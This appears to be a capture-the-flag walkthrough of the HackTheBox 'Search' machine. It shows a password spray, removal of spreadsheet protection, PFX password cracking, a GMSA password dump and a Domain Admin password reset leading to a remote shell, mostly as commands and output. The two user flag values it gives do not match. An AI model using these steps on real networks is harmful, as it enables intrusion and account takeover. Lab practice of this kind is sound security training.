SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\edgar.jacobs:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Edith.Walls:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\eve.galvan:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\eve.galvan:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\frederick.cuevas:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\frederick.cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\hope.sharp:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\jayla.roberts:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\jayla.roberts:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jordan.Gregory:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jordan.Gregory:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\payton.harmon:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\payton.harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Reginald.Morton:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\santino.benjamin:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\santino.benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Savanah.Velazquez:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\trace.ryan:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\trace.ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE 



We have now 2 users: hope.sharp with IsolationIsKey? and edgar.jacobs with @3ONEmillionbaby .

Emumerating SMB as edgar.jacobs

smbmap -u edgar.jacobs -p  '@3ONEmillionbaby' -H 10.10.11.129
[+] IP: 10.10.11.129:445	Name: search.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL           


	we now have access to helpdesk folder but it has no value for us. Next we go to RedirectedFolders$ and to edgar.jacobs desktop where we find something:

	smbclient -U edgar.jacobs //10.10.11.129/RedirectedFolders$
Password for [WORKGROUP\edgar.jacobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Mon Apr 17 17:24:36 2023
  ..                                 Dc        0  Mon Apr 17 17:24:36 2023
  abril.suarez                       Dc        0  Tue Apr  7 21:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 16:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 15:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 21:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 15:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 21:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 16:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 15:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 21:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 14:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 23:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 15:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 21:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 21:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 17:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 21:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 16:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 23:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 14:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 21:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 15:21:42 2020
  sierra.frye                        Dc        0  Thu Nov 18 03:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 23:14:26 2020

		3246079 blocks of size 4096. 612442 blocks available
smb: \> cd edgar.jacobs\
smb: \edgar.jacobs\> ls
  .                                  Dc        0  Thu Apr  9 23:04:11 2020
  ..                                 Dc        0  Thu Apr  9 23:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 13:02:16 2020
  Documents                         DRc        0  Mon Aug 10 13:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 13:02:17 2020

		3246079 blocks of size 4096. 612442 blocks available
smb: \edgar.jacobs\> cd Desktop
smb: \edgar.jacobs\Desktop\> ls
  .                                 DRc        0  Mon Aug 10 13:02:16 2020
  ..                                DRc        0  Mon Aug 10 13:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 23:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 13:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 23:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 13:35:44 2020

		3246079 blocks of size 4096. 612442 blocks available
smb: \edgar.jacobs\Desktop\> get Phishing_Attempt.xlsx 
getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as Phishing_Attempt.xlsx (93.0 KiloBytes/sec) (average 93.0 KiloBytes/sec)
smb: \edgar.jacobs\Desktop\> 


we have a xls folder with some usernames and there seems to be a missing column that is passwd protected.

Even though column C of the table is password protected we can remove the protection by doing the following:

unzip Phishing_Attempt.xlsx
sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
zip -fr Phishing_Attempt.xlsx *

now we have the full contents of the table:


firstname	lastname	password	Username
Payton	Harmon	;;36!cried!INDIA!year!50;;	Payton.Harmon
Cortez	Hickman	..10-time-TALK-proud-66..	Cortez.Hickman
Bobby	Wolf	??47^before^WORLD^surprise^91??	Bobby.Wolf
Margaret	Robinson	//51+mountain+DEAR+noise+83//	Margaret.Robinson
Scarlett	Parks	++47|building|WARSAW|gave|60++	Scarlett.Parks
Eliezer	Jordan	!!05_goes_SEVEN_offer_83!!	Eliezer.Jordan
Hunter	Kirby	~~27%when%VILLAGE%full%00~~	Hunter.Kirby
Sierra	Frye	$$49=wide=STRAIGHT=jordan=28$$18	Sierra.Frye
Annabelle	Wells	==95~pass~QUIET~austria~77==	Annabelle.Wells
Eve	Galvan	//61!banker!FANCY!measure!25//	Eve.Galvan
Jeramiah	Fritz	??40:student:MAYOR:been:66??	Jeramiah.Fritz
Abby	Gonzalez	&&75:major:RADIO:state:93&&	Abby.Gonzalez
Joy	Costa	**30*venus*BALL*office*42**	Joy.Costa
Vincent	Sutton	**24&moment&BRAZIL&members&66**	Vincent.Sutton


now we can use crackmapexec to get a valid username / password combination. we need to create a new user file and a new passwd file

we have a new user;

crackmapexec smb 10.10.11.129 -u xlsx_users.txt -p xlsx_pass.txt --no-bruteforce --continue-on-success
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&66** STATUS_LOGON_FAILURE 



let's log to smb to see what we have

smbmap -u sierra.frye -p  '$$49=wide=STRAIGHT=jordan=28$$18' -H 10.10.11.129
[+] IP: 10.10.11.129:445	Name: search.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL    

smbclient //10.10.11.129/RedirectedFolders$ "$$49=wide=STRAIGHT=jordan=28$$18" -U sierra.frye
Password for [WORKGROUP\sierra.frye]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dc        0  Mon Apr 17 17:41:07 2023
  ..                                 Dc        0  Mon Apr 17 17:41:07 2023
  abril.suarez                       Dc        0  Tue Apr  7 21:12:58 2020
  Angie.Duffy                        Dc        0  Fri Jul 31 16:11:32 2020
  Antony.Russo                       Dc        0  Fri Jul 31 15:35:32 2020
  belen.compton                      Dc        0  Tue Apr  7 21:32:31 2020
  Cameron.Melendez                   Dc        0  Fri Jul 31 15:37:36 2020
  chanel.bell                        Dc        0  Tue Apr  7 21:15:09 2020
  Claudia.Pugh                       Dc        0  Fri Jul 31 16:09:08 2020
  Cortez.Hickman                     Dc        0  Fri Jul 31 15:02:04 2020
  dax.santiago                       Dc        0  Tue Apr  7 21:20:08 2020
  Eddie.Stevens                      Dc        0  Fri Jul 31 14:55:34 2020
  edgar.jacobs                       Dc        0  Thu Apr  9 23:04:11 2020
  Edith.Walls                        Dc        0  Fri Jul 31 15:39:50 2020
  eve.galvan                         Dc        0  Tue Apr  7 21:23:13 2020
  frederick.cuevas                   Dc        0  Tue Apr  7 21:29:22 2020
  hope.sharp                         Dc        0  Thu Apr  9 17:34:41 2020
  jayla.roberts                      Dc        0  Tue Apr  7 21:07:00 2020
  Jordan.Gregory                     Dc        0  Fri Jul 31 16:01:06 2020
  payton.harmon                      Dc        0  Thu Apr  9 23:11:39 2020
  Reginald.Morton                    Dc        0  Fri Jul 31 14:44:32 2020
  santino.benjamin                   Dc        0  Tue Apr  7 21:10:25 2020
  Savanah.Velazquez                  Dc        0  Fri Jul 31 15:21:42 2020
  sierra.frye                        Dc        0  Thu Nov 18 03:01:46 2021
  trace.ryan                         Dc        0  Thu Apr  9 23:14:26 2020

		3246079 blocks of size 4096. 612353 blocks available
smb: \> cd sierra.frye\
smb: \sierra.frye\> ls
  .                                  Dc        0  Thu Nov 18 03:01:46 2021
  ..                                 Dc        0  Thu Nov 18 03:01:46 2021
  Desktop                           DRc        0  Thu Nov 18 03:08:00 2021
  Documents                         DRc        0  Fri Jul 31 17:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 17:45:36 2020
  user.txt                           Ac       33  Thu Nov 18 02:55:27 2021

		3246079 blocks of size 4096. 612353 blocks available
smb: \sierra.frye\> cat user.txt
cat: command not found
smb: \sierra.frye\> type user.txt
type: command not found
smb: \sierra.frye\> get user.txt 
getting file \sierra.frye\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \sierra.frye\> 

now we have the user.txt
f8230a099d5e45ed6fd57e4ba67e141a

In the desktop folder there are 2 interesting files, let's get them to our machine:

smb: \sierra.frye\Downloads\Backups\> ls
  .                                 DHc        0  Mon Aug 10 23:39:17 2020
  ..                                DHc        0  Mon Aug 10 23:39:17 2020
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 18:04:11 2020
  staff.pfx                          Ac     4326  Mon Aug 10 23:39:17 2020

		3246079 blocks of size 4096. 612329 blocks available
smb: \sierra.frye\Downloads\Backups\> get search-RESEARCH-CA.p12 
getting file \sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 of size 2643 as search-RESEARCH-CA.p12 (10.8 KiloBytes/sec) (average 5.6 KiloBytes/sec)
smb: \sierra.frye\Downloads\Backups\> get staff.pfx 
getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as staff.pfx (17.7 KiloBytes/sec) (average 9.7 KiloBytes/sec)
smb: \sierra.frye\Downloads\Backups\> 


When I try to upload the downloaded certificate to mozzila, it asks me for a passwd
there is a tool from john that helps us to crack the hashes:

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ pfx2john search-RESEARCH-CA.p12 > search-RESEARCH-CA.p12.hash

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ pfx2john staff.pfx > staff.pfx.hash

┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ john -w=/usr/share/wordlists/rockyou.txt staff.pfx.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx)     
1g 0:00:00:42 DONE (2023-04-17 17:49) 0.02367g/s 129921p/s 129921c/s 129921C/s misssnamy..missionaries
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


┌──(gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ john -w=/usr/share/wordlists/rockyou.txt search-RESEARCH-CA.p12.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (search-RESEARCH-CA.p12)     
1g 0:00:00:42 DONE (2023-04-17 17:50) 0.02328g/s 127743p/s 127743c/s 127743C/s misssnamy..missionaries
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


now we can import both certificates. After this we visit https://search.htb/staff and we are presented with Windows Powershell Web Access

We use sierra frye credentials and we log in to "reasearch" computer.


Back in Bloodhound, I’ll mark Sierra.Frye as owned. Now the “Shortest Paths to Domain Admins from Owned Principles” brings out something nice

By being in BIRMINGHAM-ITSEC, which is in ITSEC, Sierra.Frye has ReadGMSAPassword over BIR-ADFS-GMSA. That account has GenericAll over Tristan.Davies, who is in Domain Admins.
Get Password

Group Managed Service Accounts (GMSA) are where Windows servers manage the password for an account by generating a long random password for it. This article shows how to create a GMSA, and how to manage the ACL for that password. It also shows how to use PowerShell to dump the GMSA password for the service account. I’ll follow the same steps:



PS C:\Users\Sierra.Frye\Desktop> 

$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'

PS C:\Users\Sierra.Frye\Desktop> 

$mp = $gmsa.'msDS-ManagedPassword'

PS C:\Users\Sierra.Frye\Desktop> 

ConvertFrom-ADManagedPasswordBlob $mp

 

 

Version                   : 1

CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤

                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇

SecureCurrentPassword     : System.Security.SecureString

PreviousPassword          : 

SecurePreviousPassword    : 

QueryPasswordInterval     : 2543.10:38:46.8496050

UnchangedPasswordInterval : 2543.10:33:46.8496050

 

 PS C:\Users\Sierra.Frye\Desktop> 

(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword

ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱

茾蒚⟒澽座걍盡篇

PS C:\Users\Sierra.Frye\Desktop> 

$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword

PS C:\Users\Sierra.Frye\Desktop> 

$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

 

PS C:\Users\Sierra.Frye\Desktop> 

$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass

PS C:\Users\Sierra.Frye\Desktop> 

Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword

 (ConvertTo-SecureString -AsPlainText 'qwerty123!' -force)} -Credential $cred

PS C:\Users\Sierra.Frye\Desktop> 


Now we check if the password change worked:

gabriel.hajdu㉿SVROLP01872)-[~/Practice/HTB/Search]
└─$ crackmapexec smb 10.10.11.129 -u tristan.davies -p 'qwerty123!' 
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:qwerty123! (Pwn3d!)


we can now log in using wmiexec.py as tristan.davies and get the root flag:

gabriel.hajdu㉿SVROLP01872)-[/usr/share/doc/python3-impacket/examples]
└─$ python wmiexec.py 'search/tristan.davies:qwerty123!@10.10.11.129'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is B8F8-6F48

 Directory of C:\

14/04/2020  11:24    <DIR>          HelpDesk
23/03/2020  08:20    <DIR>          inetpub
30/07/2020  15:43    <DIR>          PerfLogs
13/04/2022  12:21    <DIR>          Program Files
15/09/2018  08:21    <DIR>          Program Files (x86)
11/08/2020  12:39    <DIR>          RedirectedFolders
11/08/2020  08:45    <DIR>          Users
20/04/2023  14:30    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)   2,858,717,184 bytes free

C:\>cd Users\Administrator






user flag: 82e90b9bacda98f69a35cbcc08591970

root flag: 83179bfa599738aa68750ce9144d3d8e

